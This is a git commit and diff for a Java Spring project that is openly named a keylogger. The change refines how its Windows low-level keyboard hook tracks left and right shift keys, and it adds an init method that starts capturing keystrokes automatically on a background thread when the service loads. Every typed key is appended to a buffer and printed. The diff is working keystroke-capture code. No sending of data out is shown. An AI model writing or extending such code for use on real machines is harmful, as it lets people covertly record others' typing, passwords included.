d6a6d1971f972413addfc3314393f260589a1d1f
Badar Al-Busaidi <bader5uk@hotmail.com>
2025-05-13 09:25:25 +0400

    Adjusted logic to track shift key if pressed

--- src/main/java/com/badar/keylogger/Services/GlobalKeyListenerService.java
+++ src/main/java/com/badar/keylogger/Services/GlobalKeyListenerService.java
@@ -6,14 +6,26 @@ import com.sun.jna.platform.win32.*;
 import com.sun.jna.platform.win32.WinDef.LRESULT;
 import com.sun.jna.platform.win32.WinDef.WPARAM;
 import com.sun.jna.platform.win32.WinUser.*;
+import jakarta.annotation.PostConstruct;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 import org.springframework.stereotype.Service;
 
 @Service
 public class GlobalKeyListenerService {
-    private boolean shiftPressed = false;
+    private boolean leftShiftPressed = false;
+    private boolean rightShiftPressed = false;
     private StringBuilder storedInput = new StringBuilder();
     private static HHOOK hHook;
     private static final User32 user32 = User32.INSTANCE;
+
+    private static final Logger logger = LoggerFactory.getLogger(GlobalKeyListenerService.class);
+
+    @PostConstruct
+    public void init() {
+        logger.info("Initializing keylogger service...");
+        new Thread(this::startKeylogger).start();
+    }
 
     public void startKeylogger() {
         LowLevelKeyboardProc keyboardHook = new LowLevelKeyboardProc() {
@@ -21,17 +33,17 @@ public class GlobalKeyListenerService {
                 if (nCode >= 0) {
                     if (wParam.intValue() == WinUser.WM_KEYDOWN) {
                         // Track shift state
-                        if (info.vkCode == 160 || info.vkCode == 161) {
-                            shiftPressed = (wParam.intValue() == WinUser.WM_KEYDOWN);
-                            String shiftType = (info.vkCode == 160) ? "[LSHIFT]" : "[RSHIFT]";
-                            String action = shiftPressed ? "Pressed" : "Released";
-                            System.out.println(shiftType + " " + action);
+                        if (info.vkCode == WinUser.VK_LSHIFT) {
+                            leftShiftPressed = (wParam.intValue() == WinUser.WM_KEYDOWN);
                         }
-                        if(wParam.intValue() == WinUser.WM_KEYDOWN && !(info.vkCode == 160 || info.vkCode == 161)){
-                        String keypressed = KeyCodeConverter.getKeyName(info.vkCode, shiftPressed);
+                        else if (info.vkCode == WinUser.VK_RSHIFT) {
+                            rightShiftPressed = (wParam.intValue() == WinUser.WM_KEYDOWN);
+                        }
+                        if(wParam.intValue() == WinUser.WM_KEYDOWN){
+                            boolean isShiftActive = leftShiftPressed || rightShiftPressed;
+                        String keypressed = KeyCodeConverter.getKeyName(info.vkCode, isShiftActive);
                         storedInput.append(keypressed);
                         System.out.println(storedInput);
-                        System.out.println("Key pressed: " + keypressed);
                     }
                     }
                 }
